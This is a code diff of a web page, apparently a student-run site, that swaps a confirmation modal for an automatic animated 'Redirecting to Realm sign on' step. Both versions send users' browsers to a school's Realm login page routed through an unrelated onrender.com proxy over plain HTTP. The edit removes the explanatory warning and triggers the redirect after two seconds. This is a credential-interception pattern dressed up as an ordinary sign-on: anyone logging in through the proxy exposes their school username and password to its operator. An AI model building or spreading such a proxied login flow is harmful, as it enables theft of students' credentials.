@@ -1103,16 +1103,8 @@
     </div>
 
     <!-- Step 2: Confirmation Redirection -->
-    <div class="modal-step" id="modal-step-redirect" style="display: none;">
-      <h3 class="modal-title highlight">Redirecting</h3>
-      <div class="modal-info-box">
-        <span class="modal-info-box-title">Log in with Realm</span>
-        <p class="modal-text">Great! You will now need to login to add your name to the system :). Note: If you are NOT from St patricks college shorncliffe you will NOT have access to our scripts or this site. P.S teacher accounts do NOT work</p>
-      </div>
-      <p class="modal-text warning">Read above before going to realm sign on</p>
-      <div class="modal-buttons">
-        <button class="btn btn-green" id="btn-setup-okay">OKAY</button>
-      </div>
+    <div class="modal-step" id="modal-step-redirect" style="display: none; align-items: center; justify-content: center; text-align: center; padding: 40px 0;">
+      <h3 class="modal-title highlight" style="margin-bottom: 0;">Redirecting to Realm sign on<span id="redirect-dots">.</span></h3>
     </div>
   </div>
 </div>
@@ -1372,17 +1364,24 @@
     btnContinue.addEventListener('click', () => {
       stepSetup.style.display = 'none';
       stepRedirect.style.display = 'flex';
-    });
-  }
 
-  const btnOkay = document.getElementById('btn-setup-okay');
-  if (btnOkay) {
-    btnOkay.addEventListener('click', () => {
-      overlay.style.backgroundColor = '#000000';
-      overlay.style.opacity = '1';
-      const modalBox = document.querySelector('.modal-box');
-      if (modalBox) modalBox.style.display = 'none';
-      window.location.href = 'http://residential-6k3h.onrender.com/proxy?url=https://realm.stpatricks.qld.edu.au/';
+      let dotCount = 1;
+      const dotsSpan = document.getElementById('redirect-dots');
+      const dotsInterval = setInterval(() => {
+        dotCount = (dotCount % 3) + 1;
+        if (dotsSpan) {
+          dotsSpan.textContent = '.'.repeat(dotCount);
+        }
+      }, 400);
+
+      setTimeout(() => {
+        clearInterval(dotsInterval);
+        overlay.style.backgroundColor = '#000000';
+        overlay.style.opacity = '1';
+        const modalBox = document.querySelector('.modal-box');
+        if (modalBox) modalBox.style.display = 'none';
+        window.location.href = 'http://residential-6k3h.onrender.com/proxy?url=https://realm.stpatricks.qld.edu.au/';
+      }, 2000);
     });
   }
 
